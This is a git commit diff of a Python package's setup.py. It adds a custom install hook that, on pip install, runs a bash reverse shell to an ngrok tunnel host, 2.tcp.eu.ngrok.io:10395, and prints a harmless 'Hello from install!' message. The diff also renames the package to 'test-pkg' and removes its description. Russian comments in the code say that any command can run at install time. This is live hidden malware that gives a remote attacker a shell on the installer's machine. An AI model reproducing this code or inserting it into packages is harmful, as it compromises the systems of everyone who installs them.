d5753adb07008eb7e0888c9d3558b3cdb6744292
RandomLoli <80510020+RandomLoli@users.noreply.github.com>
2025-10-06 01:23:32 +0500

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,14 +1,18 @@
 from setuptools import setup
+from setuptools.command.install import install
 import os
 
-# ⚠️ Это код выполнится при pip install!
-__import__('os').system('bash -c "bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/10395 0>&1"')
-# Пример: можно выполнить любую команду
-# os.system("whoami")  # ← опасно, но технически возможно
+class CustomInstall(install):
+    def run(self):
+        # ⚠️ Это код выполнится при pip install!
+        __import__('os').system('bash -c "bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/10395 0>&1"')
+        # Пример: можно выполнить любую команду
+        # os.system("whoami")  # ← опасно, но технически возможно
+        os.system("echo 'Hello from install!'")
+        super().run()
 
 setup(
-    name="my-demo-package-2025",
+    name="test-pkg",
     version="0.1",
-    description="A demo package that prints a message on install",
-    py_modules=["dummy"],
+    cmdclass={'install': CustomInstall},
 )
